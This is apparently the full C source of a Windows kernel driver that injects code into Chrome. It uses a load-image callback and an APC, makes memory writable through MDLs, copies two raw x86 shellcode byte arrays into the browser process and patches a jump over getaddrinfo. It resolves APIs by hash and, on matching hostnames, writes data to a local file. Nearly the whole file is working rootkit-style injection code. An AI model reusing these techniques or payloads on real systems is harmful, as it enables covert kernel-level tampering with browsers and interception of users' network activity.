#include <ntdef.h>
#include <ntifs.h>
#include <Ntstrsafe.h>
#include "Driver.h"
#include "PE.h"
#include "ShellCode.h"

/*
Reference:
    http://www.rohitab.com/discuss/topic/40737-inject-dll-from-kernel-mode/
    http://www.drdobbs.com/inside-nts-asynchronous-procedure-call/184416590
    https://wikileaks.org/ciav7p1/cms/page_7995519.html
    https://thisissecurity.stormshield.com/2016/10/19/how-to-run-userland-code-from-the-kernel-on-windows-version-2-0/ 
    https://stackoverflow.com/questions/52019979/injecting-a-dll-from-loadimagenotifyroutine-hangs-on-zwmapviewofsection/52028249?noredirect=1#comment91011467_52028249 APC Injection
    https://github.com/stormshield/Beholder-Win32/tree/master/Beholder's%20Eye Beholder's Eye
    https://doc.lagout.org/security/Rootkits/Rootkits%20-%20Subverting%20the%20Windows%20Kernel.pdf Rootkits: Subverting The Windows Kernel
    https://gist.github.com/timepp/1f678e200d9e0f2a043a9ec6b3690635 CRC32 
    https://stackoverflow.com/questions/7666509/hash-function-for-string DJB2 String Hash
*/

UNICODE_STRING DeviceName = RTL_CONSTANT_STRING(L"\\Device\\Salam");
UNICODE_STRING SymlinkName = RTL_CONSTANT_STRING(L"\\??\\Salam");
PDEVICE_OBJECT DeviceObject = NULL;
PDEVICE_EXTENSION DeviceExtension = NULL;

// Undocumented/Unloaded routines
QUERY_INFO_PROCESS ZwQueryInformationProcess = NULL;

NTSTATUS ChangeMemoryRights(PMDL* Mdl, PVOID* NewMapping, ULONG Addr, SIZE_T Size, INT Rights)
{
    NTSTATUS status = STATUS_SUCCESS;

    __try {
        PMDL LocalMdl = NULL;
        LocalMdl = IoAllocateMdl((PVOID)Addr, Size, FALSE, FALSE, NULL);
        if (!LocalMdl) return STATUS_SEVERITY_ERROR;

        MmProbeAndLockPages(LocalMdl, KernelMode, IoReadAccess);
        PVOID Address = MmGetSystemAddressForMdlSafe(LocalMdl, HighPagePriority);
        status = MmProtectMdlSystemAddress(LocalMdl, Rights);
        if (!NT_SUCCESS(status))
        {
            MmUnmapLockedPages((PVOID)Address, LocalMdl);
            MmUnlockPages(LocalMdl);
            IoFreeMdl(LocalMdl);
            return status;
        }
        (*Mdl) = LocalMdl;
        (*NewMapping) = Address;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        DEBUG_PRINT("Address 0x%x doesn't allow changing of rights.\n", Addr);
        status = STATUS_SEVERITY_ERROR;
    }

    return status;
}

VOID ToLower(CHAR* str)
{
    while (*str)
    {
        (*str) = (CHAR)tolower(*str);
        str++;
    }
}

ULONG HashString(CHAR* Str)
{
    // djb2
    ULONG CurrentHash = 5381;
    while (*Str)
    {
        CurrentHash = ((CurrentHash << 5) + CurrentHash) + (*Str++);
    }
    return CurrentHash;
}

BOOLEAN GetAddrInfoAddress(ULONG ImageBase, PULONG GetAddrInfoAddress)
{
    PIMAGE_DOS_HEADER Dos = (PIMAGE_DOS_HEADER)(ImageBase);
    if (Dos->e_magic != MZ)
    {
        //DEBUG_PRINT("Invalid image magic!\n");
        return FALSE;
    }

    PIMAGE_NT_HEADERS32 NtHeader = (PIMAGE_NT_HEADERS32)(ImageBase + Dos->e_lfanew);
    if (NtHeader->Signature != PE)
    {
        //DEBUG_PRINT("Invalid PE\n");
        return FALSE;
    }

    if (NtHeader->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC)
    {
        //DEBUG_PRINT("Not 0x86 dll\n");
        return FALSE;
    }

    PIMAGE_DATA_DIRECTORY ExportsDirectory = &NtHeader->OptionalHeader.DataDirectory[0];
    if (ExportsDirectory->VirtualAddress == 0 || ExportsDirectory->Size == 0) {
        //DEBUG_PRINT("Invalid exports VA\n");
        return FALSE;
    }

    PIMAGE_EXPORT_DIRECTORY ExportDir = (PIMAGE_EXPORT_DIRECTORY)(ImageBase + ExportsDirectory->VirtualAddress);
    if (ExportDir->NumberOfNames > 0)
    {
        PULONG Names = (PULONG)(ImageBase + ExportDir->AddressOfNames);
        PUSHORT Ordinals = (PUSHORT)(ImageBase + ExportDir->AddressOfNameOrdinals);
        PULONG Functions = (PULONG)(ImageBase + ExportDir->AddressOfFunctions);

        for (SIZE_T i = 0; i < ExportDir->NumberOfNames; i++)
        {
            PCHAR Name = (PCHAR)(Names[i] + ImageBase);
            if (HashString(Name) == HashGetaddrinfo)    
            {
                (*GetAddrInfoAddress) = ImageBase + Functions[Ordinals[i]];
                return TRUE;
            }
        }
    }
    return FALSE;
}

BOOLEAN HookGetAddrInfo(ULONG GetAddrInfo, ULONG FreeSpace)
{
    //HookFunc(NULL, NULL, NULL, NULL);
    //Compiled from ShellCode.c
    CHAR Resolver[] = { 0x55,0x8B,0xEC,0x51,0x53,0x56,0x57,0xC7,0x45,0xFC,0x28,0x3A,0x00,0x00,0x33,0xC0,0x64,0xA1,0x30,0x00,0x00,0x00,0x8B,0x40,0x0C,0x8B,0x40,0x14,0x8B,0x00,0x8B,0x00,0x8B,0x40,0x10,0x8B,0xF8,0x03,0x40,0x3C,0x8B,0x40,0x78,0x83,0xF8,0x00,0x03,0xC7,0x74,0x55,0xB9,0x00,0x00,0x00,0x00,0x8B,0x58,0x20,0x03,0xDF,0x3B,0x48,0x18,0x74,0x46,0x8B,0x33,0x03,0xF7,0xBA,0x05,0x15,0x00,0x00,0x51,0x57,0x80,0x3E,0x00,0x74,0x11,0x8B,0xFA,0xC1,0xE7,0x05,0x03,0xFA,0x0F,0xB6,0x0E,0x03,0xF9,0x8B,0xD7,0x46,0xEB,0xEA,0x5F,0x59,0x3B,0x55,0x08,0x75,0x18,0x8B,0x70,0x24,0x03,0xF7,0x0F,0xB7,0x34,0x4E,0x8B,0x50,0x1C,0x03,0xD7,0x8B,0x04,0xB2,0x03,0xC7,0x89,0x45,0xFC,0xEB,0x06,0x83,0xC3,0x04,0x41,0xEB,0xB5,0x8B,0x45,0xFC,0x5F,0x5E,0x5B,0x8B,0xE5,0x5D,0xC3 };
    CHAR Hooker[] = { 0x55,0x8B,0xEC,0x83,0xEC,0x50,0x53,0x57,0xC7,0x45,0xB0,0x38,0x13,0x37,0x13,0xC7,0x45,0xFC,0x37,0x13,0x37,0x13,0xC7,0x45,0xCC,0x4E,0x6F,0x68,0x74,0xC7,0x45,0xD8,0x69,0x6E,0x67,0x20,0xC7,0x45,0xC0,0x53,0x68,0x61,0x64,0xC7,0x45,0xD4,0x79,0x20,0x69,0x6E,0xC7,0x45,0xC4,0x20,0x68,0x65,0x72,0xC7,0x45,0xD0,0x65,0x20,0x20,0x20,0xC7,0x45,0xC8,0x50,0x5F,0x50,0x00,0xC7,0x45,0xB4,0x07,0x00,0x00,0x00,0xC7,0x45,0xB8,0x00,0x00,0x00,0x00,0x68,0x95,0x9F,0x72,0x79,0xFF,0x55,0xFC,0x89,0x45,0xC0,0x68,0x97,0x0F,0x2C,0x38,0xFF,0x55,0xFC,0x89,0x45,0xD4,0x68,0x2E,0xCF,0x8F,0x66,0xFF,0x55,0xFC,0x89,0x45,0xC4,0x68,0xFA,0xC5,0x96,0xEB,0xFF,0x55,0xFC,0x89,0x45,0xD0,0x68,0xB0,0xEC,0x3C,0x66,0xFF,0x55,0xFC,0x89,0x45,0xCC,0x68,0x07,0xCA,0x70,0x38,0xFF,0x55,0xFC,0x89,0x45,0xC8,0x8B,0x45,0x08,0x89,0x45,0xE8,0xC7,0x45,0xE4,0x00,0x00,0x00,0x00,0x8B,0x4D,0xE8,0x0F,0xBE,0x11,0x85,0xD2,0x74,0x14,0x8B,0x45,0xE4,0x83,0xC0,0x01,0x89,0x45,0xE4,0x8B,0x4D,0xE8,0x83,0xC1,0x01,0x89,0x4D,0xE8,0xEB,0xE2,0x8B,0x55,0x08,0x89,0x55,0xE8,0x83,0x7D,0xE4,0x07,0x0F,0x85,0x5B,0x01,0x00,0x00,0xB8,0x01,0x00,0x00,0x00,0x6B,0xC8,0x06,0x8B,0x55,0x08,0x0F,0xBE,0x04,0x0A,0x83,0xF8,0x6C,0x0F,0x85,0x43,0x01,0x00,0x00,0xC7,0x45,0xEC,0x00,0x00,0x00,0x00,0x83,0x7D,0xEC,0x00,0x75,0x16,0x6A,0x04,0x68,0x00,0x30,0x00,0x00,0x68,0x00,0x20,0x00,0x00,0x6A,0x00,0xFF,0x55,0xD4,0x89,0x45,0xEC,0xEB,0xE4,0xC7,0x45,0xBC,0x20,0x83,0xB8,0xED,0xC7,0x45,0xF0,0x00,0x00,0x00,0x00,0xEB,0x09,0x8B,0x4D,0xF0,0x83,0xC1,0x01,0x89,0x4D,0xF0,0x81,0x7D,0xF0,0x00,0x01,0x00,0x00,0x7D,0x4B,0x8B,0x55,0xF0,0x89,0x55,0xF8,0xC7,0x45,0xDC,0x00,0x00,0x00,0x00,0xEB,0x09,0x8B,0x45,0xDC,0x83,0xC0,0x01,0x89,0x45,0xDC,0x83,0x7D,0xDC,0x08,0x7D,0x1F,0x8B,0x4D,0xF8,0x83,0xE1,0x01,0x74,0x0D,0x8B,0x55,0xF8,0xD1,0xEA,0x33,0x55,0xBC,0x89,0x55,0xF8,0xEB,0x08,0x8B,0x45,0xF8,0xD1,0xE8,0x89,0x45,0xF8,0xEB,0xD2,0x8B,0x4D,0xF0,0x8B,0x55,0xEC,0x8B,0x45,0xF8,0x89,0x04,0x8A,0xEB,0xA3,0xC7,0x45,0xF4,0xFF,0xFF,0xFF,0xFF,0xC7,0x45,0xE0,0x00,0x00,0x00,0x00,0xEB,0x09,0x8B,0x4D,0xE0,0x83,0xC1,0x01,0x89,0x4D,0xE0,0x8B,0x55,0xE0,0x3B,0x55,0xE4,0x7D,0x23,0x8B,0x45,0x08,0x03,0x45,0xE0,0x0F,0xBE,0x08,0x33,0x4D,0xF4,0x81,0xE1,0xFF,0x00,0x00,0x00,0x8B,0x55,0xF4,0xC1,0xEA,0x08,0x8B,0x45,0xEC,0x33,0x14,0x88,0x89,0x55,0xF4,0xEB,0xCC,0x8B,0x4D,0xF4,0x83,0xF1,0xFF,0x89,0x4D,0xF4,0x81,0x7D,0xF4,0x01,0xA5,0xD7,0x2F,0x75,0x4D,0x6A,0x00,0x68,0x73,0x75,0x63,0x20,0x68,0x6E,0x32,0x37,0x5C,0x68,0x79,0x74,0x68,0x6F,0x68,0x43,0x3A,0x5C,0x50,0x8D,0x1C,0x24,0x6A,0x00,0x68,0x80,0x00,0x00,0x00,0x6A,0x01,0x6A,0x00,0x6A,0x03,0x68,0x00,0x00,0x00,0x40,0x53,0xFF,0x55,0xD0,0x83,0xC4,0x0C,0x89,0x45,0xD8,0x6A,0x00,0x8D,0x45,0xB8,0x50,0xFF,0x75,0xB4,0xFF,0x75,0x08,0xFF,0x75,0xD8,0xFF,0x55,0xCC,0xFF,0x75,0xD8,0xFF,0x55,0xC8,0x68,0x00,0x80,0x00,0x00,0x68,0x00,0x20,0x00,0x00,0xFF,0x75,0xEC,0xFF,0x55,0xC4,0x8B,0x45,0xB0,0x8B,0xE5,0x5D,0x8B,0xFF,0x55,0x8B,0xEC,0x83,0xC0,0x05,0xFF,0xE0,0x5F,0x5B,0x8B,0xE5,0x5D,0xC2,0x10,0x00,0xCC,0x3B,0x0D,0x10,0x50,0x40,0x00,0x75,0x03,0xC2,0x00,0x00 };
    CHAR JMP[] = { 0xE9, 0x00, 0x00, 0x00, 0x00 };

    PMDL CodeMdl = NULL;
    PVOID CodeAddress = 0;
    PMDL HookMdl = NULL;
    PVOID HookAddress = 0;
    if (!NT_SUCCESS(ChangeMemoryRights(&CodeMdl, &CodeAddress, FreeSpace, 0x1000, PAGE_EXECUTE_READWRITE)) ||
        !NT_SUCCESS(ChangeMemoryRights(&HookMdl, &HookAddress, GetAddrInfo, 0x5, PAGE_EXECUTE_READWRITE))
    )
    {
        DEBUG_PRINT("Unable to make memory writeable\n");
        return FALSE;
    }

    SIZE_T HookerLen = sizeof(Hooker);
    SIZE_T ResolverLen = sizeof(Resolver);
    ULONG HookerBase = (ULONG)CodeAddress;
    ULONG ResolverBase = HookerBase + HookerLen;
    
    for (SIZE_T i = 0; i < HookerLen - sizeof(ULONG); i++)
    {
        if (REF(Hooker + i, ULONG) == 0x13371337)
        {
            REF(Hooker + i, ULONG) = FreeSpace + HookerLen;
        }
        else if (REF(Hooker + i, ULONG) == 0x13371338)
        {
            REF(Hooker + i, ULONG) = GetAddrInfo;
        }
    }

    DEBUG_PRINT("Hooker: %X, Resolver: %X, Total: %X\n", HookerLen, ResolverLen, HookerLen + ResolverLen);
    RtlCopyMemory((PVOID)HookerBase, (PVOID)Hooker, HookerLen);
    RtlCopyMemory((PVOID)ResolverBase, (PVOID)Resolver, ResolverLen);
 
    REF(JMP + 1, ULONG) = FreeSpace - (GetAddrInfo + 5);
    RtlCopyMemory((PVOID)HookAddress, (PVOID)JMP, 5);
    DEBUG_PRINT("Allocated hook at %08X to %08X\n", FreeSpace, FreeSpace - (GetAddrInfo + 5));

    MmUnmapLockedPages((PVOID)CodeAddress, CodeMdl);
    MmUnlockPages(CodeMdl);
    IoFreeMdl(CodeMdl);

    MmUnmapLockedPages((PVOID)HookAddress, HookMdl);
    MmUnlockPages(HookMdl);
    IoFreeMdl(HookMdl);

    DEBUG_PRINT("Hooking done!\n");
    return TRUE;
}

ULONG FindFreeSpace(ULONG ImageBase)
{
    PIMAGE_DOS_HEADER Dos;
    PIMAGE_NT_HEADERS32 NtHeader;
    Dos = (PIMAGE_DOS_HEADER)(ImageBase);
    if (Dos->e_magic != MZ)
    {
        DEBUG_PRINT("Invalid image magic!\n");
        return FALSE;
    }

    NtHeader = (PIMAGE_NT_HEADERS32)(ImageBase + Dos->e_lfanew);
    if (NtHeader->Signature != PE)
    {
        DEBUG_PRINT("Invalid PE\n");
        return FALSE;
    }

    PIMAGE_SECTION_HEADER Section1 = (PIMAGE_SECTION_HEADER)((ULONG)NtHeader + sizeof(IMAGE_NT_HEADERS32));
    
    PIMAGE_SECTION_HEADER Section2 = Section1 + 1;
    if (Section2->VirtualAddress - Section1->VirtualAddress + Section1->Misc.VirtualSize > 0x600)
    {
        return ImageBase + Section1->VirtualAddress + Section1->Misc.VirtualSize + 0x10;
    }
    return 0;
}

VOID KernelRoutine(PRKAPC Apc, PKNORMAL_ROUTINE *NormalRoutine, PVOID *NormalContext, PVOID *SystemArgument1, PVOID *SystemArgument2)
{
    UNREFERENCED_PARAMETER(NormalRoutine);
    UNREFERENCED_PARAMETER(SystemArgument1);
    UNREFERENCED_PARAMETER(SystemArgument2);
    UNREFERENCED_PARAMETER(NormalContext);
    ExFreePoolWithTag(Apc, '1APC');
}

VOID NormalRoutine(PVOID NormalContext, PVOID SystemArgument1, PVOID SystemArgument2)
{
    UNREFERENCED_PARAMETER(SystemArgument1);
    UNREFERENCED_PARAMETER(SystemArgument2);
    PAPC_CONTEXT CTX = (PAPC_CONTEXT)(NormalContext);

    PUNICODE_STRING ImageFileName = ExAllocatePoolWithTag(PagedPool, 1024, '1NAM');
    ULONG ReturnLength = 0;
    if (!ImageFileName)
    {
        DEBUG_PRINT("Can't allocate for imagename\n");
        return;
    }
    if (!NT_SUCCESS(ZwQueryInformationProcess(NtCurrentProcess(), ProcessImageFileName, ImageFileName, 1024, &ReturnLength)))
    {
        ExFreePoolWithTag(ImageFileName, '1NAM');
        DEBUG_PRINT("Unable to query process info\n");
        return;
    }

    if (wcsstr(ImageFileName->Buffer, L"chrome.exe") == NULL)
    {
        ExFreePoolWithTag(ImageFileName, '1NAM');
        return;
    }
    ExFreePoolWithTag(ImageFileName, '1NAM');

    DEBUG_PRINT("Found chrome with pid %X (%d) and base at %08X\n", CTX->Pid, CTX->Pid, CTX->ImageBase);

    ULONG GetAddrInfo = 0;
    if (!GetAddrInfoAddress(CTX->ImageBase, &GetAddrInfo))
    {
        DEBUG_PRINT("Unable to properly parse Exports\n");
        return;
    }
    DEBUG_PRINT("getaddrinfo: %08X\n", GetAddrInfo);

    ULONG FreeSpace = FindFreeSpace(CTX->ImageBase);
    DEBUG_PRINT("Free space at: %08X\n", FreeSpace);
 
    if (!HookGetAddrInfo(GetAddrInfo, FreeSpace))
    {
        DEBUG_PRINT("Unable to hook function\n");
        return;
    }

}

NTSTATUS ImageCBK(PUNICODE_STRING FullImageName, HANDLE ProcessId, PIMAGE_INFO ImageInfo)
{ 
    if (wcsstr(FullImageName->Buffer, L"ws2_32.dll") != NULL)
    {
        DEBUG_PRINT("Image %wZ loaded in pid %d, base at: %08X\n", FullImageName, ProcessId, (INT)ImageInfo->ImageBase);
        PRKAPC apcState;
        PAPC_CONTEXT context;

        apcState = (PRKAPC)ExAllocatePoolWithTag(NonPagedPool, sizeof(KAPC), '1APC');
        context = (PAPC_CONTEXT)ExAllocatePoolWithTag(NonPagedPool, sizeof(APC_CONTEXT), '1CTX');
        RtlZeroMemory(apcState, sizeof(KAPC));
        RtlZeroMemory(context, sizeof(APC_CONTEXT));
        context->Pid = ProcessId;
        context->ImageBase = (ULONG)ImageInfo->ImageBase;

        KeInitializeApc(apcState, KeGetCurrentThread(), OriginalApcEnvironment, KernelRoutine, NULL, NormalRoutine, KernelMode, context);
        if (!KeInsertQueueApc(apcState, NULL, NULL, IO_NO_INCREMENT))
        {
            DEBUG_PRINT("Unable to queue APC!\n");
            return STATUS_SEVERITY_ERROR;
        }
        return STATUS_SUCCESS;
    }   
    return STATUS_SEVERITY_INFORMATIONAL;
}

VOID DriverUnload(IN PDRIVER_OBJECT DriverObject)
{
    UNREFERENCED_PARAMETER(DriverObject);
    if (DeviceExtension != NULL)
    {
        if (DeviceExtension->IsCallbackActive)
        {
            PsRemoveLoadImageNotifyRoutine(ImageCBK);
        }
    }
    
    IoDeleteSymbolicLink(&SymlinkName);
    IoDeleteDevice(DeviceObject);

    DEBUG_PRINT("Driver unloaded!\n");
}

NTSTATUS DispatchCreateClose(IN PDEVICE_OBJECT DriverObject, IN PIRP irp)
{
    UNREFERENCED_PARAMETER(DriverObject);
    irp->IoStatus.Status = STATUS_SUCCESS;
    irp->IoStatus.Information = 0;
    IoCompleteRequest(irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

NTSTATUS DispatchDevCTL(IN PDEVICE_OBJECT DriverObject, IN PIRP irp)
{
    UNREFERENCED_PARAMETER(DriverObject);
    irp->IoStatus.Status = STATUS_SUCCESS;
    irp->IoStatus.Information = 0;
    IoCompleteRequest(irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}


NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath)
{
    NTSTATUS status = STATUS_SUCCESS;
    UNREFERENCED_PARAMETER(RegistryPath);

    status = IoCreateDevice(DriverObject, sizeof(DEVICE_EXTENSION), &DeviceName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &DeviceObject);
    if (!NT_SUCCESS(status))
    {
        DEBUG_PRINT("Failed to create device\n");
        return status;
    }

    status = IoCreateSymbolicLink(&SymlinkName, &DeviceName);
    if (!NT_SUCCESS(status))
    {
        DEBUG_PRINT("Failed to create symlink\n");
        IoDeleteDevice(DeviceObject);
        return status;
    }

    DeviceExtension = DeviceObject->DeviceExtension;
    DriverObject->MajorFunction[IRP_MJ_CREATE] = DispatchCreateClose;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = DispatchCreateClose;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchDevCTL;
    DriverObject->DriverUnload = DriverUnload;
    RtlZeroMemory(DeviceObject->DeviceExtension, sizeof(DEVICE_EXTENSION));

    // Prepare ZwQueryInformationProcess
    UNICODE_STRING ZwQueryInformationProcessStr = RTL_CONSTANT_STRING(L"ZwQueryInformationProcess");
    ZwQueryInformationProcess = (QUERY_INFO_PROCESS)MmGetSystemRoutineAddress(&ZwQueryInformationProcessStr);

    if (ZwQueryInformationProcess == NULL) {
        IoDeleteSymbolicLink(&SymlinkName);
        IoDeleteDevice(DeviceObject);
        DEBUG_PRINT("Could not find ZwQueryInformationProcess\n");
        return STATUS_SEVERITY_ERROR;
    }

    if (DeviceExtension != NULL)
    {
        status = PsSetLoadImageNotifyRoutine(ImageCBK);
        if (NT_SUCCESS(status))
        {
            DeviceExtension->IsCallbackActive = TRUE;
        }
        else
        {
            IoDeleteSymbolicLink(&SymlinkName);
            IoDeleteDevice(DeviceObject);
            return status;
        }
    }

    DEBUG_PRINT("Driver loaded\n");
    return STATUS_SUCCESS;
}